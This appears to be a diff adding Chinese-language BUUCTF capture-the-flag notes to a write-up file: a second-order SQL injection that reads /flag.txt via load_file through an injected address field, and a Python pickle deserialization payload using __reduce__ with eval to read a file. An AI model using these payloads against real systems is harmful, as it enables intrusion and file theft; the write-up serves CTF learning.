@@ -791,3 +791,47 @@ php短标签:
 ![image-20240515124703693](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240515124703693.png)
 
 得到flag
+
+
+
+# buuctf cypherpunk
+
+可以使用为协议读取源码
+
+```
+$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+```
+
+上述这段代码,详细解释一下:
+
+当传入
+
+```
+address=',`address`=(select load_file('/flag.txt'))
+```
+
+可以符合原本代码的格式
+
+可以注入
+
+`$row = $fetch->fetch_assoc();`直接从数据库中获取了地址,没有被过滤,可以进行二次注入
+
+注意:sql注入时,不一定在当前数据库,可能需要你查询其他数据库
+
+但本题flag在/flag.txt下面,使用上面的payload读取
+
+
+
+# buuctf ikun
+
+```
+import pickle
+import urllib.parse
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt').read()",))
+a = pickle.dumps(payload(),protocol=0)  #python3的写法
+print(urllib.parse.quote(a))
+
+```
+
